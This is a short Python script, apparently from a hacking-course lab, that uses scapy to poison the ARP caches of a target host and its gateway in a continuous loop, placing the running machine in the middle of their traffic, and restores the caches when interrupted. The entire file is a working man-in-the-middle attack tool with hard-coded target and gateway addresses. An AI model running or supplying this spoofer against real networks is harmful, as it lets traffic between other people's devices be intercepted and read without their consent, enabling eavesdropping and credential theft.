import scapy.all as scapy
import time
import sys


def spoofer(ip_target, ip_spoof):
    mac_target = mac_getter(ip_target)
    packet = scapy.ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_spoof)
    scapy.send(packet, verbose=False)


def mac_getter(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def restore(ip_dest, ip_source):
    mac_dest = mac_getter(ip_dest)
    mac_source = mac_getter(ip_source)
    packet = scapy.ARP(op=2, pdst=ip_dest, hwdst=mac_dest, psrc=ip_source, hwsrc=mac_source)
    scapy.send(packet, count=4, verbose=False)


TARGET_IP = "10.0.2.7"
GATEWAY_IP = "10.0.2.1"

counter = 0
try:
    while True:
        spoofer(TARGET_IP, GATEWAY_IP)
        spoofer(GATEWAY_IP, TARGET_IP)
        counter += 2
        print(f"\r[+] Packets sent: {str(counter)}", sys.stdout.flush())
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] CTRL C PRESSED... Quitting Program.")
    restore(TARGET_IP, GATEWAY_IP)
    restore(GATEWAY_IP, TARGET_IP)
